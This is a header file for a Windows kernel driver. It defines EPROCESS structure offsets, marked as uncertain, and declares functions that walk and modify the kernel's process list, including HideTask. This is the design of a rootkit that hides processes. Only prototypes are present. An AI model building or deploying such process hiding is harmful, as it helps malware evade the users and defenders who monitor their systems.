#pragma once
#pragma warning (disable : 4100)

#include <ntifs.h>

#include "messages.h"
#include <wdm.h>
#include "IRQL_s.h"
#include "datatype.h"
#include "dbgmsg.h"

#define EPROCESS_OFFSET_PID		0x0b4 //??
#define EPROCESS_OFFSET_NAME	0x16c //??
#define EPROCESS_OFFSET_LINKS	0x0b8 //??

#define SZ_EPROCESS_NAME		0x010 //??

BYTE* getNextPEP(BYTE* currentPEP);

BYTE* getPreviousPEP(BYTE* currentPEP);

void getTaskName(BYTE* dest, BYTE* src);

int getPID(BYTE* currentPEP);

void printNameInHex(BYTE* src);

void modifyTaskListEntry(UCHAR* currentPEP);

void modifyTaskList(DWORD pid);

void HideTask(DWORD* pid);
